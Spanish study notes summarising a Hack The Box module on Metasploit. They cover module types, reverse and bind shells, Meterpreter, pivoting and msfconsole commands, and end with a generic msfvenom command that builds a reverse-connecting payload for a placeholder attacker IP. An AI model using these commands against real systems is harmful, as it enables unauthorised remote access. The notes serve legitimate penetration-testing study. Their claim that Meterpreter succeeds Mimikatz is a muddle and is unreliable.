---
title: Uso del Metasploit Framework - Resumen del Módulo HTB
module: Metasploit Framework
category: Exploitation
tags: [Metasploit, MSFconsole, Exploit, Payload, Meterpreter, Pivoting, Post-Exploitation, msfvenom]
---
# 00_Overview

**Metasploit Framework (MSF)** es un *framework* de código abierto fundamental en el *pentesting* y la ciberseguridad. Está diseñado para asistir en la investigación de vulnerabilidades, el desarrollo de *exploits* y las pruebas de penetración.

El *Framework* es altamente extensible y se basa en una arquitectura de módulos, lo que permite a los usuarios integrar fácilmente nuevas funcionalidades. Es una herramienta esencial para realizar tareas complejas, automatizar la explotación, y facilitar las fases de post-explotación y *pivoting*.

Existen dos versiones principales:
1.  **Metasploit Pro:** Versión de pago, comercial, con interfaz gráfica (GUI).
2.  **Metasploit Framework:** Versión gratuita, de código abierto, operada mediante la consola de comandos (`msfconsole`).

---

# Concepts

## 🏗️ Arquitectura del Framework (Módulos)

El Framework se basa en una colección de módulos que interactúan entre sí para lograr la explotación.

| Tipo de Módulo | Descripción | Tarea Clave |
| :--- | :--- | :--- |
| **Exploits** | Código que apunta a una vulnerabilidad específica para obtener acceso al sistema. | Comprometer el sistema objetivo. |
| **Payloads** | Código que se ejecuta en el sistema objetivo tras una explotación exitosa. | Abrir una sesión (shell, Meterpreter). |
| **Auxiliary** | Módulos que realizan tareas de escaneo, *fuzzing* o recopilación de información que no comprometen directamente el sistema. | Descubrimiento e información. |
| **Post-Exploitation** | Módulos para tareas a realizar *después* de establecer una sesión, como la escalada de privilegios o el *pivoting*. | Persistencia y movimiento lateral. |
| **Encoders** | Herramientas para codificar el *payload* y evadir los sistemas de detección basados en firmas (AV/IDS). | Evasión. |
| **NOPs (No Operation)** | Instrucciones que ayudan a mantener el tamaño consistente del *payload*. | Estabilidad del *payload*. |

## 🧬 Payloads y Sesiones

* **Payloads:** Son el código que el *exploit* entrega a la máquina objetivo.
    * **Reverse Shell:** La máquina comprometida inicia la conexión de vuelta al atacante. Es el método preferido en entornos con *firewalls* que filtran el tráfico entrante.
    * **Bind Shell:** La máquina comprometida abre un puerto y espera a que el atacante se conecte a él.
* **Meterpreter:** Es el *payload* avanzado y versátil del *Framework*. Se ejecuta totalmente en la memoria del proceso (in-memory) y proporciona un *shell* avanzado con comandos integrados. Es el sucesor de otras extensiones antiguas como Mimikatz (ahora integrado como Kiwi).
* **Sesiones (Sessions):** Una vez que un *payload* se ejecuta con éxito, se establece una conexión o sesión. Pueden ser de tipo `shell` (básico) o `meterpreter` (avanzado).

## 🌐 Post-Explotación y Pivoting

* **Pivoting:** Utilizar una máquina comprometida como un punto de salto (*jump point*) para alcanzar sistemas en una red interna que no son accesibles directamente desde la red del atacante.
* **Módulos Post-Explotación:** Se utilizan para tareas como la recolección de *hashes*, claves, información de red, o la escalada de privilegios, una vez que la sesión ha sido establecida.

---

# Tools

## 💻 MSFconsole (Comandos Principales)

| Comando | Sintaxis / Uso | Función |
| :--- | :--- | :--- |
| **Lanzamiento** | `msfconsole` | Inicia la interfaz de línea de comandos del Metasploit Framework. |
| **Búsqueda** | `search <término>` | Busca módulos de cualquier tipo (exploit, auxiliary, post) por nombre, descripción, o plataforma (OS, servicio). |
| **Selección** | `use <módulo>` | Carga un módulo específico para su configuración y uso. Se puede usar el nombre completo o el ID numérico. |
| **Opciones** | `show options` | Muestra los parámetros obligatorios (`Required: yes`) y opcionales del módulo cargado. |
| **Configuración** | `set <Parámetro> <Valor>` | Establece el valor de un parámetro (ej. `set RHOSTS 10.10.10.10`, `set PAYLOAD windows/meterpreter/reverse_tcp`). |
| **Ejecución** | `run` o `exploit` | Ejecuta el módulo cargado con la configuración actual. |
| **Sesiones** | `sessions -l` | Lista las sesiones activas. |
| **Interacción** | `sessions -i <ID>` | Interactúa con la sesión cuyo ID se especifica. |
| **Segundo Plano** | `background` o `Ctrl+Z` | Envía la sesión actual a segundo plano, permitiendo al usuario volver a `msfconsole`. |

## ⚙️ msfvenom

* **Descripción:** Herramienta independiente integrada en el *Framework*.
* **Caso de Uso:** Generación y codificación de *payloads* (*shellcode*) independientes para su uso fuera de `msfconsole`.

**Sintaxis Genérica para Meterpreter:**

```bash
msfvenom -p <PAYLOAD> LHOST=<IP_ATACANTE> LPORT=<PUERTO> -f <FORMATO> -o <ARCHIVO_SALIDA>
```